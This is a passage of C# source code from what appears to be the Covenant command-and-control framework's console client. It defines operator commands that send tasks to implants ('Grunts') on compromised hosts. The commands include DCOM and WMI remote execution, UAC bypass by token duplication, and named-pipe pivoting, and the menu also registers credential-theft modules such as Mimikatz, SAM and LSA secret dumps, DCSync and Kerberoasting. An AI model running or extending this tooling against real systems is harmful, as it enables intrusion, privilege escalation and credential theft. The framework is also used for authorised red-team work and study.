                            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Password");
                        }
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                        task.LeavingMenuItem();
                    }
                }
                catch (HttpOperationException e)
                {
                    EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
                }
            }
        }
    }

    public class MenuCommandGruntInteractDCOMCommand : MenuCommand
    {
        public MenuCommandGruntInteractDCOMCommand()
        {
            this.Name = "DCOMCommand";
            this.Description = "Execute a process on a remote system using various DCOM methods.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Command" },
                new MenuCommandParameter { Name = "Method" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 3)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: dcomcommand <computername> <command> [ <method> ]");
            }
            else
            {
                List<string> methods = new List<string> { "mmc20.application", "mmc20_application", "shellwindows", "shellbrowserwindow", "exceldde" };
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "DCOMCommand" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);

                string command = String.Join(" ", commands.GetRange(2, commands.Count() - 2));
                if (commands.Count() == 4 && methods.Contains(commands.Last().ToLower()))
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Method " + commands.Last());
                    command = String.Join(" ", commands.GetRange(2, commands.Count() - 3));
                }

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + command);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractDCOMGrunt : MenuCommand
    {
        public MenuCommandGruntInteractDCOMGrunt()
        {
            this.Name = "DCOMGrunt";
            this.Description = "Execute a Grunt Launcher on a remote system using various DCOM methods.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Launcher" },
                new MenuCommandParameter { Name = "Method" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3 && commands.Count() != 4)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: dcomgrunt <computername> <launcher> [ <method> ]");
            }
            else
            {
                try
                {
                    List<string> launchers = menuItem.CovenantClient.ApiLaunchersGet().Select(L => L.Name.ToLower()).ToList();
                    if (!launchers.Contains(commands[2].ToLower()))
                    {
                        EliteConsole.PrintFormattedErrorLine("Invalid Launcher name: \"" + commands[2] + "\" specified. Valid Launchers: " + String.Join(",", launchers));
                        EliteConsole.PrintFormattedErrorLine("Usage: dcomgrunt <computername> <launcher> [ <method> ]");
                    }

                    List<string> methods = new List<string> { "mmc20.application", "shellwindows", "shellbrowserwindow", "exceldde" };
                    if (commands.Count() == 4 && !methods.Contains(commands[3].ToLower()))
                    {
                        EliteConsole.PrintFormattedErrorLine("Invalid DCOM Method: \"" + commands[3] + "\" specified. Valid Methods: " + String.Join(",", methods));
                        EliteConsole.PrintFormattedErrorLine("Usage: dcomcommand <computername> <command> [ <method> ]");
                    }
                    GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                    TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                    task.ValidateMenuParameters(new string[] { "DCOMGrunt" });

                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[2]);

                    if (commands.Count() == 4)
                    {
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Method " + commands[3]);
                    }
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                    task.LeavingMenuItem();
                }
                catch (HttpOperationException e)
                {
                    EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
                }
            }
        }
    }

    public class MenuCommandGruntInteractBypassUACCommand : MenuCommand
    {
        public MenuCommandGruntInteractBypassUACCommand()
        {
            this.Name = "BypassUACCommand";
            this.Description = "Bypasses UAC through token duplication and executes a command with high integrity.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: bypassuaccommand <command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "BypassUACCommand" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractBypassUACGrunt : MenuCommand
    {
        public MenuCommandGruntInteractBypassUACGrunt()
        {
            this.Name = "BypassUACGrunt";
            this.Description = "Bypasses UAC through token duplication and executes a Grunt Launcher with high integrity.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Launcher" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: bypassuacgrunt <launcher>");
            }
            else
            {
                try
                {
                    List<string> launchers = menuItem.CovenantClient.ApiLaunchersGet().Select(L => L.Name.ToLower()).ToList();
                    if (!launchers.Contains(commands[1].ToLower()))
                    {
                        EliteConsole.PrintFormattedErrorLine("Invalid Launcher name: \"" + commands[1] + "\" specified. Valid Launchers: " + String.Join(",", launchers));
                        EliteConsole.PrintFormattedErrorLine("Usage: bypassuacgrunt <launcher>");
                    }

                    GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                    TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                    task.ValidateMenuParameters(new string[] { "BypassUACGrunt" });
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[1]);
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                    task.LeavingMenuItem();
                }
                catch (HttpOperationException e)
                {
                    EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
                }
            }
        }
    }

    public class MenuCommandGruntInteractHistory : MenuCommand
    {
        public MenuCommandGruntInteractHistory(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "History";
            this.Description = "Show the output of completed task(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Task" }
            };
        }

        private void PrintTasking(GruntTasking tasking, Grunt grunt)
        {
            EliteConsole.PrintFormattedInfoLine("[" + tasking.CompletionTime + " UTC] Grunt: " + grunt.Name + " " + "GruntTasking: " + tasking.Name);
            EliteConsole.PrintFormattedInfoLine("(" + tasking.TaskingUser + ") > " + tasking.TaskingCommand);
            EliteConsole.PrintInfoLine(tasking.GruntTaskOutput);
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            try
            {
                menuItem.Refresh();
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                List<string> commands = Utilities.ParseParameters(UserInput);
                List<GruntTasking> completedGruntTaskings = this.CovenantClient.ApiGruntsByIdTaskingsGet(gruntInteractMenuItem.Grunt.Id ?? default)
                                          .Where(T => T.Status == GruntTaskingStatus.Completed).OrderBy(T => T.CompletionTime).ToList();
                List<string> completedgruntTaskingNames = completedGruntTaskings.Select(T => T.Name.ToLower()).ToList();
                if (commands.Count() != 2 && commands.Count() != 1)
                {
                    EliteConsole.PrintFormattedErrorLine("Invalid History command. Usage is: History [ <completed_task_name> | <task_quantity> ]");
                    EliteConsole.PrintFormattedErrorLine("Valid completed TaskNames: " + String.Join(", ", completedgruntTaskingNames));
                    return;
                }
                int quantity = completedGruntTaskings.Count();
                if (commands.Count() == 1)
                {
                    foreach (GruntTasking tasking in completedGruntTaskings)
                    {
                        this.PrintTasking(tasking, gruntInteractMenuItem.Grunt);
                    }
                }
                else
                {
                    bool isQuantity = int.TryParse(commands[1], out quantity);
                    if (completedgruntTaskingNames.Contains(commands[1].ToLower()))
                    {
                        GruntTasking tasking = completedGruntTaskings.FirstOrDefault(GT => GT.Name.ToLower() == commands[1].ToLower());
                        this.PrintTasking(tasking, gruntInteractMenuItem.Grunt);
                    }
                    else if (isQuantity)
                    {
                        List<GruntTasking> quantityTaskings = completedGruntTaskings.TakeLast(quantity).ToList();
                        foreach (GruntTasking tasking in quantityTaskings)
                        {
                            this.PrintTasking(tasking, gruntInteractMenuItem.Grunt);
                        }
                    }
                    else
                    {
                        EliteConsole.PrintFormattedErrorLine("Invalid History command. Usage is: History [ <completed_task_name> | <task_quantity> ]");
                        EliteConsole.PrintFormattedErrorLine("Valid completed TaskNames: " + String.Join(", ", completedgruntTaskingNames));
                        return;
                    }
                }
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class MenuCommandGruntInteractConnect : MenuCommand
    {
        public MenuCommandGruntInteractConnect(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Connect";
            this.Description = "Connect to a Grunt using a named pipe.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "PipeName" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            menuItem.Refresh();
            GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
            string[] commands = UserInput.Split(" ");
            if (commands.Length < 2 || commands.Length > 3 || commands[0].ToLower() != "connect")
            {
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            string PipeName = "gruntsvc";
            if (commands.Length == 3)
            {
                PipeName = commands[2];
            }
            GruntTasking gruntTasking = new GruntTasking
            {
                Id = 0,
                GruntId = gruntInteractMenuItem.Grunt.Id,
                TaskId = 1,
                Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                Status = GruntTaskingStatus.Uninitialized,
                Type = GruntTaskingType.Connect,
                TaskingMessage = commands[1] + "," + PipeName,
                TaskingCommand = UserInput,
                TokenTask = false
            };
            try
            {
                this.CovenantClient.ApiGruntsByIdTaskingsPost(gruntInteractMenuItem.Grunt.Id ?? default, gruntTasking);
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class MenuCommandGruntInteractDisconnect : MenuCommand
    {
        public MenuCommandGruntInteractDisconnect(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Disconnect";
            this.Description = "Disconnect to a Grunt using a named pipe.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ChildGruntName" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            try
            {
                menuItem.Refresh();
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                string[] commands = UserInput.Split(" ");
                if (commands.Length != 2 || commands[0].ToLower() != "disconnect")
                {
                    menuItem.PrintInvalidOptionError(UserInput);
                    return;
                }
                Grunt grunt = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.Name == commands[1]);
                if (grunt == null)
                {
                    EliteConsole.PrintFormattedErrorLine("Invalid GruntName selected: " + commands[1]);
                    menuItem.PrintInvalidOptionError(UserInput);
                    return;
                }
                List<string> childrenGruntGuids = gruntInteractMenuItem.Grunt.Children.ToList();
                if (!childrenGruntGuids.Contains(grunt.Guid))
                {
                    EliteConsole.PrintFormattedErrorLine("Grunt: \"" + commands[1] + "\" is not a child Grunt");
                    menuItem.PrintInvalidOptionError(UserInput);
                    return;
                }
                GruntTasking gruntTasking = new GruntTasking
                {
                    Id = 0,
                    GruntId = gruntInteractMenuItem.Grunt.Id,
                    TaskId = 1,
                    Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                    Status = GruntTaskingStatus.Uninitialized,
                    Type = GruntTaskingType.Disconnect,
                    TaskingMessage = grunt.Guid,
                    TaskingCommand = UserInput,
                    TokenTask = false
                };
                this.CovenantClient.ApiGruntsByIdTaskingsPost(gruntInteractMenuItem.Grunt.Id ?? default, gruntTasking);
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class MenuCommandGruntInteractJobs : MenuCommand
    {
        public MenuCommandGruntInteractJobs(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Jobs";
            this.Description = "Get a list of actively running tasks.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            menuItem.Refresh();
            GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
            string[] commands = UserInput.Split(" ");
            if (commands.Length != 1 || commands[0].ToLower() != "jobs")
            {
                EliteConsole.PrintFormattedErrorLine("Invalid Jobs command. Usage is: Jobs");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            GruntTasking gruntTasking = new GruntTasking
            {
                Id = 0,
                GruntId = gruntInteractMenuItem.Grunt.Id,
                TaskId = 1,
                Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                Status = GruntTaskingStatus.Uninitialized,
                Type = GruntTaskingType.Jobs,
                TaskingMessage = "Jobs",
                TaskingCommand = UserInput,
                TokenTask = false
            };
            try
            {
                this.CovenantClient.ApiGruntsByIdTaskingsPost(gruntInteractMenuItem.Grunt.Id ?? default, gruntTasking);
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class GruntInteractMenuItem : MenuItem
    {
        public Grunt Grunt { get; set; }

        public string PowerShellImport { get; set; } = "";

        public GruntInteractMenuItem(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.MenuTitle = "Interact";
            this.MenuDescription = "Interact with a Grunt.";
            try
            {
                this.MenuItemParameters = new List<MenuCommandParameter> {
                    new MenuCommandParameter {
                        Name = "Grunt Name",
                        Values = CovenantClient.ApiGruntsGet().Where(G => G.Status == GruntStatus.Active)
                                               .Select(G => new MenuCommandParameterValue { Value = G.Name }).ToList()
                    }
                };
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
            this.MenuOptions.Add(new TaskMenuItem(this.CovenantClient, Grunt));

            this.AdditionalOptions.Add(new MenuCommandGruntInteractShow(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSet(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractWhoAmI());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractListDirectory());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractChangeDirectory());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractProcessList());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRegistryRead());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRegistryWrite());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractUpload());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDownload());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractAssembly());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractAssemblyReflect());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpShell());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractShell());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractShellCmd());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPowerShell());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPowerShellImport());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPortScan());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractMimikatz());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractLogonPasswords());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSamDump());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractLsaSecrets());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDCSync());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRubeus());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpDPAPI());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpUp());
            // this.AdditionalOptions.Add(new MenuCommandGruntInteractSafetyKatz());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpDump());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpWMI());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractKerberoast());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainGroup());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainComputer());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLocalGroup());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLocalGroupMember());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLoggedOnUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetSession());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractImpersonateUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractImpersonateProcess());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetSystem());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractMakeToken());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRevertToSelf());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractWMICommand());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractWMIGrunt());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDCOMCommand());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDCOMGrunt());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractBypassUACCommand());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractBypassUACGrunt());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractConnect(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDisconnect(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractHistory(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractJobs(this.CovenantClient));

            this.SetupMenuAutoComplete();
        }

        public override void Refresh()
        {
            try
            {
                this.Grunt = this.CovenantClient.ApiGruntsByIdGet(this.Grunt.Id ?? default);
                ((TaskMenuItem)this.MenuOptions.FirstOrDefault(M => M.GetType().Name == "TaskMenuItem")).Grunt = Grunt;

                List<MenuCommandParameterValue> gruntNames = CovenantClient.ApiGruntsGet().Where(G => G.Status == GruntStatus.Active)
                                                                           .Select(G => new MenuCommandParameterValue { Value = G.Name }).ToList();
                this.MenuItemParameters.FirstOrDefault(P => P.Name == "Grunt Name").Values = gruntNames;

                this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "History").Parameters.FirstOrDefault().Values =
                        this.CovenantClient.ApiGruntsByIdTaskingsGet(this.Grunt.Id ?? default)
                        .Where(GT => GT.Status == GruntTaskingStatus.Completed)
                        .Select(GT => new MenuCommandParameterValue { Value = GT.Name })
                        .ToList();

                this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "Disconnect").Parameters.FirstOrDefault().Values =
                    this.Grunt.Children.Select(C =>
                    {
                        try
                        {
                            return new MenuCommandParameterValue { Value = this.CovenantClient.ApiGruntsGuidByGuidGet(C).Name };
                        }
                        catch (Exception) { return null; }
                    }).Where(C => C != null).ToList();

                this.SetupMenuAutoComplete();
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }

        public override bool ValidateMenuParameters(string[] parameters, bool forwardEntrance = true)
        {
            try
            {
                if (forwardEntrance)
                {
                    if (parameters.Length != 1)
                    {
                        EliteConsole.PrintFormattedErrorLine("Must specify a GruntName.");
                        EliteConsole.PrintFormattedErrorLine("Usage: Interact <grunt_name>");
                        return false;
                    }
                    string gruntName = parameters[0].ToLower();
                    Grunt specifiedGrunt = CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.Name.ToLower() == gruntName);
                    if (specifiedGrunt == null)
                    {
                        EliteConsole.PrintFormattedErrorLine("Specified invalid GruntName: " + gruntName);
                        EliteConsole.PrintFormattedErrorLine("Usage: Interact <grunt_name>");
                        return false;
                    }
                    this.MenuTitle = gruntName;
                    this.Grunt = specifiedGrunt;
                }
                this.Refresh();
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
            return true;
        }

        public override void PrintMenu()
        {
            this.AdditionalOptions.FirstOrDefault(O => O.Name == "Show").Command(this, "");
        }

        public override void LeavingMenuItem()
        {
            this.MenuTitle = "Interact";
        }
    }
}